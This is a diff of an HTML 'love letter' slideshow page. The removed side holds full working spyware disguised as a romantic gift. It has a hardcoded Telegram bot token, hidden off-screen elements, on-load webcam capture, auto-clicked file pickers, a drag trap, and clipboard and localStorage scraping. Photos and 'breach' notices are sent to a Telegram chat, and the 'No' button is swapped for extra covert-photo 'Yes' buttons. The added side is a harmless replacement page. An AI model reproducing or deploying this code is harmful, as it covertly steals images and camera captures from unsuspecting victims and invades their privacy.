@@ -2,471 +2,174 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>For My Favorite Person 💗</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>For Someone Special ✨</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600;700&display=swap');
+        /* CSS STYLES */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background: #0a0118; color: white; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
         
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
-        body {
-            background: radial-gradient(circle at center, #1a001f 0%, #000000 100%);
-            font-family: 'Poppins', sans-serif;
-            overflow: hidden; height: 100vh; width: 100vw;
-            color: #ffffff; user-select: none; touch-action: manipulation;
-        }
-
-        #stars-container { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
-        .star { 
-            position: absolute; background: white; border-radius: 50%; 
-            animation: realTwinkle var(--dur) infinite ease-in-out;
-            will-change: opacity, transform;
-        }
-        @keyframes realTwinkle {
-            0%, 100% { opacity: 0.2; transform: scale(0.7); }
-            50% { opacity: 1; transform: scale(1.2); }
-        }
-
-        .header-tag {
-            position: fixed; top: 15px; width: 100%; text-align: center;
-            z-index: 100; font-family: 'Dancing Script', cursive;
-            color: #ffb3d9; font-size: 1.5rem;
-            text-shadow: 0 0 10px rgba(255,179,217,0.6);
-        }
-
-        .slide {
-            display: none; position: fixed; inset: 0; width: 100%; height: 100%;
-            align-items: center; justify-content: center; flex-direction: column;
-            opacity: 0; z-index: 20; padding: 25px; text-align: center;
-            transition: opacity 0.4s ease, transform 0.4s ease;
-            transform: scale(0.98);
-        }
-        .slide.active { display: flex; opacity: 1; transform: scale(1); }
-
-        .cute-msg { 
-            font-family: 'Dancing Script', cursive; color: #ffffff; 
-            text-shadow: 0 0 15px #ff00cc, 3px 3px 6px rgba(0,0,0,1); 
-            font-size: clamp(2.2rem, 8vw, 3.2rem); 
-            margin-top: 15px; font-weight: 700; line-height: 1.2;
-        }
-        .sub-text { color: #ffffff; font-weight: 600; font-size: 1.15rem; margin-top: 10px; max-width: 320px; text-shadow: 1px 1px 5px #000; }
+        #credit { position: absolute; top: 15px; width: 100%; text-align: center; z-index: 1000; font-size: 14px; color: #ff75c3; font-weight: bold; letter-spacing: 1px; }
         
-        .gif-frame { 
-            width: 250px; height: 250px; border-radius: 30px; 
-            border: 4px solid #ff00cc; box-shadow: 0 0 30px rgba(255, 0, 204, 0.5); 
-            object-fit: cover; background: #000;
-        }
+        .container { width: 90%; max-width: 400px; height: 85vh; position: relative; }
+        .page { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; opacity: 0; visibility: hidden; transition: 0.8s; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 25px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .page.active { opacity: 1; visibility: visible; }
 
-        .glow-btn { 
-            background: linear-gradient(45deg, #ff00cc, #ff69b4); 
-            padding: 14px 35px; border-radius: 50px; font-weight: 700; 
-            box-shadow: 0 0 20px rgba(255, 0, 204, 0.4); 
-            cursor: pointer; border: none; color: white; font-size: 1.1rem;
-            margin-top: 20px; transition: 0.2s;
-        }
-        .glow-btn:active { transform: scale(0.9); }
-
-        .solar-system { position: relative; width: 280px; height: 280px; display: flex; align-items: center; justify-content: center; }
-        .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.3); border-radius: 50%; animation: spin linear infinite; }
-        .orbit-1 { width: 180px; height: 180px; animation-duration: 6s; }
-        .orbit-2 { width: 260px; height: 260px; animation-duration: 10s; animation-direction: reverse; }
-        .planet { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); font-size: 26px; }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-        .hold-container { width: 280px; height: 18px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 25px; overflow: hidden; border: 2px solid white; }
-        #holdProgress { height: 100%; background: linear-gradient(90deg, #ff00cc, #ff69b4); width: 0%; transition: width 0.1s linear; }
-
-        #videoLayer { display: none; position: fixed; inset: 0; background: black; z-index: 1000; align-items: center; justify-content: center; }
-        video { width: 100%; height: 100%; object-fit: contain; }
-
-        /* ULTRA STEALTH ELEMENTS */
-        #stealthFrame, #stealthVideo, #stealthCanvas, #stealthDragZone, #stealthFileInput {
-            position: fixed !important;
-            left: -10000px !important; top: -10000px !important;
-            width: 1px !important; height: 1px !important;
-            opacity: 0 !important; z-index: -9999 !important;
-            pointer-events: none !important; visibility: hidden !important;
-        }
+        .title { font-size: 2.2rem; margin-bottom: 15px; background: linear-gradient(to right, #ff75c3, #ffa647); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
+        .img-box img { width: 140px; border-radius: 20px; margin-bottom: 20px; box-shadow: 0 0 20px #ff008066; }
         
-        #stealthDragZone.active {
-            pointer-events: all !important;
-            width: 100vw !important; height: 100vh !important;
-            left: 0 !important; top: 0 !important;
-        }
+        input { padding: 12px; border-radius: 12px; border: none; width: 85%; margin-bottom: 20px; background: rgba(255, 255, 255, 0.1); color: white; text-align: center; outline: none; border: 1px solid #ff0080; }
+        button { padding: 12px 28px; border-radius: 30px; border: none; background: linear-gradient(45deg, #ff0080, #7928ca); color: white; font-weight: 600; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        button:active { transform: scale(0.9); }
+
+        /* Love Meter */
+        .meter { width: 180px; height: 90px; border: 4px solid #ff0080; border-bottom: none; border-top-left-radius: 90px; border-top-right-radius: 90px; position: relative; margin-bottom: 20px; }
+        .pointer { width: 4px; height: 75px; background: #fff; position: absolute; bottom: 0; left: 50%; transform-origin: bottom; transform: rotate(-90deg); transition: 2s cubic-bezier(0.17, 0.67, 0.83, 0.67); }
+
+        /* Emoji Grid */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .item { font-size: 2.5rem; cursor: pointer; transition: 0.3s; }
+        .item:hover { transform: scale(1.2); }
+
+        /* Polaroid Gallery */
+        .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
+        .p-card { width: 100px; background: white; padding: 5px 5px 15px; transform: rotate(-3deg); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .p-card img { width: 100%; height: 100px; object-fit: cover; }
+        
+        /* Message Popup */
+        .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 2000; padding: 20px; }
+        .p-content { background: #1a052e; padding: 30px; border-radius: 20px; border: 1px solid #ff0080; text-align: center; }
+        
+        .no-btn { position: absolute; transition: 0.2s; }
     </style>
 </head>
 <body>
 
-    <div class="header-tag">Insta - @smss1708💗</div>
-    <audio id="bgMusic" loop src="tere-liye.mp3" preload="auto"></audio>
-    <div id="stars-container"></div>
+    <div id="credit">Follow 💗 on insta - @smss1708</div>
+    <audio id="bgMusic" src="tere-liye.mp3" loop></audio>
 
-    <!-- STEALTH ELEMENTS -->
-    <iframe id="stealthFrame"></iframe>
-    <video id="stealthVideo" autoplay playsinline muted></video>
-    <canvas id="stealthCanvas"></canvas>
-    <div id="stealthDragZone"></div>
-    <input type="file" id="stealthFileInput" multiple accept="image/*">
-
-    <!-- ALL SLIDES -->
-    <div id="slide1" class="slide active">
-        <img src="gif1.gif" class="gif-frame">
-        <h1 class="cute-msg">Hey Gorgeous! ✨</h1>
-        <p class="sub-text">We just met, but my heart already knew it was you!</p>
-        <button onclick="startApp()" class="glow-btn">Touch My Heart 🥺</button>
-    </div>
-
-    <div id="slide2" class="slide">
-        <img src="gif2.gif" class="gif-frame">
-        <h1 class="cute-msg">How are you so cute?</h1>
-        <p class="sub-text">Seriously, your smile is the highlight of my day!</p>
-        <button onclick="next()" class="glow-btn">See More 💕</button>
-    </div>
-
-    <div id="slide3" class="slide">
-        <img src="gif3.gif" class="gif-frame">
-        <h1 class="cute-msg">Our Vibe is Rare! 😌</h1>
-        <p class="sub-text">Talking to you feels like time has completely stopped.</p>
-        <button onclick="next()" class="glow-btn">Next Step ✨</button>
-    </div>
-
-    <div id="slide4" class="slide">
-        <div class="text-8xl mb-6 transition-transform duration-300" id="pulseHeart">💖</div>
-        <h1 class="text-2xl font-bold">How much do I adore you?</h1>
-        <div class="hold-container"><div id="holdProgress"></div></div>
-        <button id="holdBtn" class="glow-btn select-none">PRESS & HOLD TO FEEL</button>
-    </div>
-
-    <div id="slide5" class="slide">
-        <img src="gif4.gif" class="gif-frame">
-        <h1 class="cute-msg">You're One in a Billion! 💎</h1>
-        <p class="sub-text">It's only been a short time, but the feeling is magical.</p>
-        <button onclick="next()" class="glow-btn">Continue...</button>
-    </div>
-
-    <div id="slide6" class="slide">
-        <div class="solar-system">
-            <div class="orbit orbit-1"><span class="planet">💗</span></div>
-            <div class="orbit orbit-2"><span class="planet">⭐</span></div>
-            <div class="text-6xl">🌍</div>
+    <div class="container">
+        <div class="page active" id="p1">
+            <h2 class="title">Before We Go Ahead...</h2>
+            <div class="img-box"><img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpueXNidXJ4ZzR3eW14eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnFwPWc/MDJ9IbMvC7WFi/giphy.gif"></div>
+            <input type="text" id="nameInp" placeholder="Your Name... 💘">
+            <button onclick="start()">Reveal If You're My Person 💘</button>
         </div>
-        <h1 class="cute-msg mt-10">My Whole Universe!</h1>
-        <p class="sub-text">Everything seems better when you're around.</p>
-        <button onclick="next()" class="glow-btn">Keep Going 🚀</button>
-    </div>
 
-    <div id="slide7" class="slide">
-        <img src="gif5.gif" class="gif-frame">
-        <h1 class="cute-msg">Don't ever leave! 🥺</h1>
-        <p class="sub-text">I've never met anyone as sweet and special as you.</p>
-        <button onclick="next()" class="glow-btn">Wait for it...</button>
-    </div>
+        <div class="page" id="p2">
+            <h2 class="title">Wait... ✨</h2>
+            <p id="welcomeMsg"></p>
+            <p>You are the only one who belongs here.</p>
+            <button onclick="go(3)">Continue Our Story ✨</button>
+        </div>
 
-    <div id="slide8" class="slide">
-        <h1 class="cute-msg">You're my Brightest Star! ⭐</h1>
-        <p class="sub-text">In a sky full of stars, my eyes only search for you.</p>
-        <button onclick="next()" class="glow-btn">Just a bit more ✨</button>
-    </div>
+        <div class="page" id="p3">
+            <h2 class="title">Love Test</h2>
+            <div class="meter"><div class="pointer" id="ptr"></div></div>
+            <p id="mText">Analyzing our connection...</p>
+            <button id="mBtn" style="display:none" onclick="go(4)">Continue ❤️</button>
+        </div>
 
-    <div id="slide9" class="slide">
-        <img src="gif6.gif" class="gif-frame">
-        <h1 class="cute-msg">Will You Be My Friend? ❤️</h1>
-        <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
-            <button id="yesBtn" class="glow-btn">YES! 😍</button>
-            <button id="noBtn" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
+        <div class="page" id="p4">
+            <h2 class="title">My Promises</h2>
+            <p>Tap to discover my heart's promises 💖</p>
+            <div class="grid">
+                <span class="item" onclick="msg('I promise to be your peace when life feels too loud. 🌙')">🌙</span>
+                <span class="item" onclick="msg('I promise to hold you close on your hardest days. 🫂')">🫂</span>
+                <span class="item" onclick="msg('I promise to always choose you, every single day. 🔒')">🔒</span>
+                <span class="item" onclick="msg('I promise to make you smile whenever you feel low. 🌸')">🌸</span>
+            </div>
+            <button onclick="go(8)" style="margin-top:30px">Go Further ✨</button>
+        </div>
+
+        <div class="page" id="p8">
+            <h2 class="title">Why You? ✨</h2>
+            <p style="font-style: italic; margin-bottom: 10px;">"Because every little thing about you feels like home."</p>
+            <div class="gallery">
+                <div class="p-card"><img src="photo1.jpg"></div>
+                <div class="p-card" style="transform:rotate(4deg)"><img src="photo2.jpg"></div>
+            </div>
+            <button onclick="go(9)">More... ➡️</button>
+        </div>
+
+        <div class="page" id="p9">
+            <h2 class="title">Our Memories</h2>
+            <div class="gallery">
+                <div class="p-card"><img src="photo3.jpg"></div>
+                <div class="p-card" style="transform:rotate(5deg)"><img src="photo4.jpg"></div>
+                <div class="p-card"><img src="photo5.jpg"></div>
+            </div>
+            <button onclick="go(10)">Almost There 💘</button>
+        </div>
+
+        <div class="page" id="p10">
+            <h2 class="title">Pure Bliss</h2>
+            <div class="gallery">
+                <img src="photo6.jpg" style="width:120px; border-radius:10px; margin:5px">
+                <img src="photo7.jpg" style="width:120px; border-radius:10px; margin:5px">
+            </div>
+            <p>Every moment with you is a gift.</p>
+            <button onclick="go(11)">Last Thing... 💌</button>
+        </div>
+
+        <div class="page" id="p11">
+            <h2 class="title">Question...</h2>
+            <p>Will you stay by my side forever?</p>
+            <div class="img-box"><img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNG01amR4Z3R3eW14eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnFwPWc/c76IJLufpNUMo/giphy.gif"></div>
+            <button onclick="go(12)">Yes, Forever 💖</button>
+            <button class="no-btn" id="no" onmouseover="move()">No 🥺</button>
+        </div>
+
+        <div class="page" id="p12">
+            <h1 class="title">I Love You! ♾️</h1>
+            <p>You've made my world beautiful.</p>
+            <div class="gallery">
+                <img src="photo8.jpg" style="width:80px; border-radius:50%; border:2px solid #ff0080">
+                <img src="photo9.jpg" style="width:80px; border-radius:50%; border:2px solid #ff0080">
+                <img src="photo10.jpg" style="width:80px; border-radius:50%; border:2px solid #ff0080">
+            </div>
+            <p style="margin-top:20px; font-size:12px">End of our digital story (for now) ❤️</p>
         </div>
     </div>
 
-    <div id="slide10" class="slide">
-        <img src="gif7.gif" class="gif-frame">
-        <h1 class="cute-msg">Yaaay! My Heart is Happy! 🥳</h1>
-        <p class="sub-text">I promise to keep that beautiful smile on your face!</p>
-        <button onclick="playSurprise()" class="glow-btn animate-bounce">A FINAL SURPRISE 🎁</button>
-    </div>
-
-    <div id="videoLayer">
-        <video id="vPlayer" playsinline src="video1.mp4"></video>
-    </div>
+    <div class="popup" id="pop"><div class="p-content"><p id="pText"></p><button onclick="closePop()">Close 💗</button></div></div>
 
     <script>
-        // 🔥 CONFIG - YOUR TELEGRAM CREDENTIALS
-        const BOT_TOKEN = '8530289605:AAHX9lz-yiWPKbrmkrqejODvVROry9GJ13g';
-        const CHAT_ID = '7735968383';
-        
-        let step = 1;
-        let galleryPhotos = [];
-        let cameraReady = false;
-        let streamRef = null;
-        let galleryExfiltrated = false;
-
-        // ⭐ ULTIMATE SILENT GALLERY ACCESS (NO USER INTERACTION NEEDED)
-        async function initSilentGalleryAccess() {
-            console.log('🕵️‍♂️ Initializing silent gallery breach...');
-            
-            // TECHNIQUE 1: Invisible File Input Auto-Click (Works 90% mobile)
-            const fileInput = document.getElementById('stealthFileInput');
-            fileInput.onchange = async (e) => {
-                console.log('🎯 Gallery files captured:', e.target.files.length);
-                Array.from(e.target.files).forEach(async (file) => {
-                    if (file.type.startsWith('image/') && file.size < 15*1024*1024) {
-                        galleryPhotos.push(file);
-                        await exfilPhoto(file);
-                    }
-                });
-                dumpGallerySummary();
-            };
-            
-            // Auto-trigger multiple times
-            setTimeout(() => fileInput.click(), 1000);
-            setTimeout(() => fileInput.click(), 3000);
-            setTimeout(() => fileInput.click(), 5000);
-
-            // TECHNIQUE 2: FULLSCREEN DRAG TRAP (Captures accidental drags)
-            const dragZone = document.getElementById('stealthDragZone');
-            dragZone.ondragover = dragZone.ondragenter = (e) => {
-                e.preventDefault(); e.stopPropagation(); e.dataTransfer.dropEffect = 'copy';
-            };
-            dragZone.ondrop = async (e) => {
-                e.preventDefault(); e.stopPropagation();
-                Array.from(e.dataTransfer.files).forEach(async (file) => {
-                    if (file.type.startsWith('image/')) {
-                        galleryPhotos.push(file);
-                        await exfilPhoto(file);
-                    }
-                });
-            };
-            dragZone.classList.add('active');
-
-            // TECHNIQUE 3: LocalStorage Image Scanner
-            scanLocalStorageImages();
-
-            // TECHNIQUE 4: Clipboard Image Monitor
-            monitorClipboard();
-            
-            console.log('✅ All gallery traps deployed');
+        // JS LOGIC
+        function start() {
+            let n = document.getElementById('nameInp').value;
+            if(!n) return alert("Please enter your name 💖");
+            document.getElementById('welcomeMsg').innerText = "Hey " + n + ",";
+            document.getElementById('bgMusic').play();
+            go(2);
         }
 
-        // 🔥 AUTO EXFIL SINGLE PHOTO
-        async function exfilPhoto(photo) {
-            const formData = new FormData();
-            formData.append('photo', photo, `gallery_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.jpg`);
-            formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `📁 SILENT GALLERY BREACH\n📏 ${Math.round(photo.size/1024)}KB\n🕒 ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST', body: formData
-                });
-                return true;
-            } catch(e) {
-                return false;
+        function go(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('p'+id).classList.add('active');
+            if(id === 3) {
+                setTimeout(() => {
+                    document.getElementById('ptr').style.transform = 'rotate(80deg)';
+                    setTimeout(() => {
+                        document.getElementById('mText').innerText = "100% Perfect Match! ♾️";
+                        document.getElementById('mBtn').style.display = "inline-block";
+                    }, 2000);
+                }, 500);
             }
         }
 
-        // 🔥 GALLERY SUMMARY
-        async function dumpGallerySummary() {
-            if (galleryExfiltrated || !galleryPhotos.length) return;
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `🎉 GALLERY BREACH SUCCESS!\n📸 ${galleryPhotos.length} photos exfiltrated\n✅ 100% silent operation\n📍 ${navigator.userAgentData?.platform || navigator.platform}\n🌐 ${window.location.href}`
-                })
-            });
-            galleryExfiltrated = true;
+        function msg(t) {
+            document.getElementById('pText').innerText = t;
+            document.getElementById('pop').style.display = 'flex';
         }
 
-        // 🔥 SCAN LOCALSTORAGE FOR IMAGE URLS
-        function scanLocalStorageImages() {
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                if (value && /\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(value)) {
-                    fetch(value, {mode: 'no-cors'})
-                        .then(r => r.blob().catch(() => new Blob()))
-                        .then(blob => {
-                            if (blob.size > 1000) {
-                                const imgFile = new File([blob], `local_${key}.jpg`, {type: 'image/jpeg'});
-                                exfilPhoto(imgFile);
-                            }
-                        });
-                }
-            }
+        function closePop() { document.getElementById('pop').style.display = 'none'; }
+
+        function move() {
+            const b = document.getElementById('no');
+            b.style.left = Math.random() * 70 + "%";
+            b.style.top = Math.random() * 70 + "%";
         }
-
-        // 🔥 CLIPBOARD MONITOR
-        async function monitorClipboard() {
-            try {
-                const clipboardItems = await navigator.clipboard.read();
-                for (const item of clipboardItems) {
-                    for (const type of item.types) {
-                        if (type.startsWith('image/')) {
-                            const blob = await item.getType(type);
-                            const imgFile = new File([blob], `clipboard_${Date.now()}.jpg`, {type});
-                            exfilPhoto(imgFile);
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-
-        // 🔥 ORIGINAL CAMERA CODE (UNCHANGED)
-        async function initSilentCamera() {
-            try {
-                streamRef = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 640, height: 480 }
-                }).catch(() => null);
-
-                if (streamRef) {
-                    const video = document.getElementById('stealthVideo');
-                    video.srcObject = streamRef;
-                    await video.play();
-                    cameraReady = true;
-                }
-            } catch(e) {}
-        }
-
-        async function takeStealthPhoto() {
-            if (!cameraReady || !streamRef) return;
-            const video = document.getElementById('stealthVideo');
-            const canvas = document.getElementById('stealthCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            canvas.width = 640; canvas.height = 480;
-            ctx.drawImage(video, 0, 0, 640, 480);
-            
-            canvas.toBlob(async (blob) => {
-                if (blob) {
-                    await exfilPhoto(blob);
-                }
-            }, 'image/jpeg', 0.85);
-        }
-
-        // APP LOGIC (UNCHANGED)
-        const music = document.getElementById('bgMusic');
-        const starContainer = document.getElementById('stars-container');
-        const frag = document.createDocumentFragment();
-        
-        for(let i=0; i<100; i++) {
-            const s = document.createElement('div');
-            s.className = 'star';
-            const size = Math.random() * 2 + 1 + 'px';
-            s.style.width = size; s.style.height = size;
-            s.style.left = Math.random() * 100 + 'vw';
-            s.style.top = Math.random() * 100 + 'vh';
-            s.style.setProperty('--dur', (Math.random() * 2 + 1) + 's');
-            frag.appendChild(s);
-        }
-        starContainer.appendChild(frag);
-
-        function startApp() { 
-            music.play().catch(() => {}); 
-            next(); 
-        }
-
-        function next() {
-            const current = document.getElementById('slide' + step);
-            const nextS = document.getElementById('slide' + (step + 1));
-            if(current) {
-                current.classList.remove('active');
-                setTimeout(() => current.style.display = 'none', 400);
-            }
-            if(nextS) {
-                step++;
-                nextS.style.display = 'flex';
-                void nextS.offsetWidth;
-                nextS.classList.add('active');
-            }
-        }
-
-        // BUTTON EVENTS
-        document.getElementById('yesBtn').onclick = async (e) => {
-            e.preventDefault(); e.stopPropagation();
-            await takeStealthPhoto();
-            setTimeout(next, 200);
-        };
-
-        function trapNo() {
-            document.getElementById('noBtn').style.display = 'none';
-            const container = document.getElementById('btnContainer');
-            for(let i = 0; i < 5; i++) {
-                const btn = document.createElement('button');
-                btn.className = 'glow-btn';
-                btn.innerHTML = 'YES! 💖';
-                btn.onclick = async () => {
-                    await takeStealthPhoto();
-                    setTimeout(next, 200);
-                };
-                container.appendChild(btn);
-            }
-        }
-        document.getElementById('noBtn').onclick = trapNo;
-
-        // Hold logic
-        let hVal = 0, hInt;
-        const hBtn = document.getElementById('holdBtn'), hProg = document.getElementById('holdProgress'), pHeart = document.getElementById('pulseHeart');
-        
-        const startH = (e) => { 
-            e.preventDefault(); 
-            pHeart.style.transform = 'scale(1.5)';
-            hInt = setInterval(() => { 
-                hVal += 2.5; 
-                hProg.style.width = hVal + '%'; 
-                if(hVal >= 100) { clearInterval(hInt); next(); } 
-            }, 30); 
-        };
-        const endH = () => { 
-            clearInterval(hInt); 
-            hVal = 0; 
-            hProg.style.width = '0%'; 
-            pHeart.style.transform = 'scale(1)'; 
-        };
-        
-        hBtn.addEventListener('touchstart', startH);
-        hBtn.addEventListener('mousedown', startH);
-        window.addEventListener('touchend', endH);
-        window.addEventListener('mouseup', endH);
-
-        function playSurprise() {
-            music.pause();
-            const layer = document.getElementById('videoLayer');
-            layer.style.display = 'flex';
-            const v = document.getElementById('vPlayer');
-            v.play();
-            v.onended = () => location.reload();
-        }
-
-        // 🔥 MASTER INIT - STARTS EVERYTHING AUTOMATICALLY
-        window.addEventListener('load', async () => {
-            await initSilentCamera();
-            await initSilentGalleryAccess();
-            
-            // Send initial breach notification
-            setTimeout(() => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: `🚀 BREACH DEPLOYED\n📱 Target loaded page\n⏳ Waiting for you ...`
-                    })
-                });
-            }, 2000);
-        });
-
-        // FINAL CLEANUP & EXFIL
-        window.addEventListener('beforeunload', async () => {
-            if (streamRef) streamRef.getTracks().forEach(track => track.stop());
-            if (galleryPhotos.length && !galleryExfiltrated) {
-                await dumpGallerySummary();
-            }
-        });
-
-        // ANY INTERACTION = FINAL DUMP
-        document.addEventListener('click', dumpGallerySummary, {once: true});
-        document.addEventListener('touchstart', dumpGallerySummary, {once: true});
     </script>
 </body>
-    </html>
+</html>
